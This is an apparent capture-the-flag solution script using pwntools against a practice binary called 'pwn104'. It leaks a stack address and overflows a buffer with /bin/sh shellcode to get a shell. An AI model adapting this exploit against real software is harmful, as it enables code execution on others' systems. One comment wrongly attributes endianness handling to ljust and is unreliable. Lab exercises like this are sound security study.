from pwn import *

# sets up everything in the exploit for exploiting a 64-bit Intel binary
binary = context.binary = ELF("pwn104.pwn104", checksec=False)

# starts the process
p = process(binary.path)

# receives the output until the string in parenthesis
p.recvuntil(b"I'm waiting for you at ")

# save ^ into this variable and decode it for later
address = int(p.recv().decode("utf-8")[2:], 16)

# craft /bin/sh shellcode
payload = asm(shellcraft.sh())

# ljust() method will left align the string (we need to do this to adjust the endianess 2 little guy endian)
payload = payload.ljust(0x58, b"A")

# Packs an 64-bit integer and returns packed number as a byte string
payload += p64(address)

# Removes all the buffered data from a tube by calling pwnlib.tubes.tube.tube.recv() with a low timeout until it fails.
# If timeout is zero, only cached data will be cleared.
# Note: If timeout is set to zero, the underlying network is not actually polled; only the internal buffer is cleared.
p.clean()

# send the payload to the input
p.sendline(payload)

# get a shell...
p.interactive()
